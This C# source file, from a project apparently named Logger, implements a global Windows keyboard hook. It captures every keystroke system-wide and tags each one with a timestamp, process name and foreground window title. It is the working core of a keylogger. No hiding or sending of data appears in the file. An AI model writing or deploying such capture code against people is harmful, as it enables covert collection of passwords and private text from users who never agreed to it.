using System;
using System.Threading.Tasks;
using System.Text;
using System.Diagnostics;
using System.Windows.Input;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ComponentModel;

namespace Logger.Keyboard
{
    using WindowHandle = IntPtr;

    /// <summary>
    /// Listens keyboard globally.
    /// 
    /// <remarks>Uses WH_KEYBOARD_LL.</remarks>
    /// </summary>
    class KeyboardListener : IDisposable
    {
        /// <summary>
        /// Creates global keyboard listener.
        /// </summary>
        public KeyboardListener()
        {          
            // We have to store the LowLevelKeyboardProc, so that it is not garbage collected runtime
            hookedLowLevelKeyboardProc = (WinAPI.LowLevelKeyboardProc)LowLevelKeyboardProc;
 
            // Set the hook
            hookId = WinAPI.SetHook(hookedLowLevelKeyboardProc);
 
            // Assign the asynchronous callback event
            hookedKeyboardCallbackAsync = new KeyboardCallbackAsync(KeyboardListener_KeyboardCallbackAsync);
        }
 
        /// <summary>
        /// Destroys global keyboard listener.
        /// </summary>
        ~KeyboardListener()
        {
            Dispose();
        }
 
        /// <summary>
        /// Fired when any of the keys is pressed down.
        /// </summary>
        public event RawKeyEventHandler KeyDown;
 
        /// <summary>
        /// Fired when any of the keys is released.
        /// </summary>
        public event RawKeyEventHandler KeyUp;

        #region Inner workings

        private const int MaxTitleSize = 300;

        /// <summary>
        /// Hook ID
        /// </summary>
        private IntPtr hookId = IntPtr.Zero;
 
        /// <summary>
        /// Asynchronous callback hook.
        /// </summary>
        /// <param name="character">Character</param>
        /// <param name="keyEvent">Keyboard event</param>
        /// <param name="vkCode">VKCode</param>
        private delegate void KeyboardCallbackAsync(WinAPI.KeyEvent keyEvent, int vkCode, string character, DateTime dateTime, WindowHandle windowHandle, uint processID);
 
        /// <summary>
        /// Actual callback hook.
        /// 
        /// <remarks>Calls asynchronously the asyncCallback.</remarks>
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        [MethodImpl(MethodImplOptions.NoInlining)]
        private IntPtr LowLevelKeyboardProc(int nCode, UIntPtr wParam, IntPtr lParam)
        {
            string chars = "";

            if (nCode >= 0)
            {
                if (wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_KEYDOWN ||
                    wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_KEYUP ||
                    wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_SYSKEYDOWN ||
                    wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_SYSKEYUP)
                {
                    bool isKeyDown = wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_KEYDOWN || wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_SYSKEYDOWN;

                    WindowHandle windowHandle;
                    uint processID;

                    chars = WinAPI.VKCodeToString((uint)Marshal.ReadInt32(lParam), isKeyDown, out windowHandle, out processID);

                    hookedKeyboardCallbackAsync.BeginInvoke((WinAPI.KeyEvent)wParam.ToUInt32(), Marshal.ReadInt32(lParam), chars, DateTime.Now, windowHandle, processID, null, null);
                }
            }
            
            return WinAPI.CallNextHookEx(hookId, nCode, wParam, lParam);
        }
 
        /// <summary>
        /// Event to be invoked asynchronously (BeginInvoke) each time key is pressed.
        /// </summary>
        private KeyboardCallbackAsync hookedKeyboardCallbackAsync;
 
        /// <summary>
        /// Contains the hooked callback in runtime.
        /// </summary>
        private WinAPI.LowLevelKeyboardProc hookedLowLevelKeyboardProc;
 
        /// <summary>
        /// HookCallbackAsync procedure that calls accordingly the KeyDown or KeyUp events.
        /// </summary>
        /// <param name="keyEvent">Keyboard event</param>
        /// <param name="vkCode">VKCode</param>
        /// <param name="character">Character as string.</param>
        void KeyboardListener_KeyboardCallbackAsync(WinAPI.KeyEvent keyEvent, int vkCode, string character, DateTime dateTime, WindowHandle windowHandle, uint processID)
        {
            string processName = GetProcessName(processID);

            StringBuilder windowTitle = new StringBuilder(MaxTitleSize);
            WinAPI.GetWindowText(windowHandle, windowTitle, MaxTitleSize);

            var eventArgs = new RawKeyEventArgs(vkCode, character, DateTime.Now, processID, processName, windowHandle, windowTitle.ToString());

            if (keyEvent == WinAPI.KeyEvent.WM_KEYDOWN || keyEvent == WinAPI.KeyEvent.WM_SYSKEYDOWN)
            {
                KeyDown?.BeginInvoke(this, eventArgs, null, null);
            }
            else if (keyEvent == WinAPI.KeyEvent.WM_KEYUP || keyEvent == WinAPI.KeyEvent.WM_SYSKEYUP)
            {
                KeyUp?.BeginInvoke(this, eventArgs, null, null);
            }
        }

        string GetProcessName(uint processID)
        {
            Process process = null;

            try
            {
                process = Process.GetProcessById(Convert.ToInt32(processID));
            }
            catch (Exception exception)
            {
                Program.Trace($"Couldn't get process with ID { processID }: { exception.Message }");
            }

            return process.TryGetFriendlyProcessName();
        }

        #endregion

        #region IDisposable Members

        /// <summary>
        /// Disposes the hook.
        /// <remarks>This call is required as it calls the UnhookWindowsHookEx.</remarks>
        /// </summary>
        public void Dispose()
        {
            WinAPI.UnhookWindowsHookEx(hookId);
        }
 
        #endregion
    }
 
    /// <summary>
    /// Raw KeyEvent arguments.
    /// </summary>
    class RawKeyEventArgs : EventArgs
    {
        /// <summary>
        /// VKCode of the key.
        /// </summary>
        public int VKCode;
 
        /// <summary>
        /// WPF Key of the key.
        /// </summary>
        public Key Key;
 
        /// <summary>
        /// Convert to string.
        /// </summary>
        /// <returns>Returns string representation of this key, if not possible empty string is returned.</returns>
        public override string ToString()
        {
            return Character;
        }
 
        /// <summary>
        /// Unicode character of key pressed.
        /// </summary>
        public string Character;

        public DateTime DateTime;  

        public uint ProcessID;

        public string ProcessName;

        public WindowHandle WindowHandle;

        public string WindowTitle;

        /// <summary>
        /// Create raw keyevent arguments.
        /// </summary>
        /// <param name="VKCode"></param>
        /// <param name="isSysKey"></param>
        /// <param name="Character">Character</param>
        public RawKeyEventArgs(int VKCode, string Character, DateTime DateTime, uint ProcessID, string ProcessName, WindowHandle WindowHandle, string WindowTitle)
        {
            this.VKCode = VKCode;
            this.Character = Character;
            this.Key = System.Windows.Input.KeyInterop.KeyFromVirtualKey(VKCode);
            this.DateTime = DateTime;
            this.ProcessID = ProcessID;
            this.ProcessName = ProcessName;
            this.WindowHandle = WindowHandle;
            this.WindowTitle = WindowTitle;
        }
 
    }
 
    /// <summary>
    /// Raw keyevent handler.
    /// </summary>
    /// <param name="sender">sender</param>
    /// <param name="args">raw keyevent arguments</param>
    delegate void RawKeyEventHandler(object sender, RawKeyEventArgs args);
}


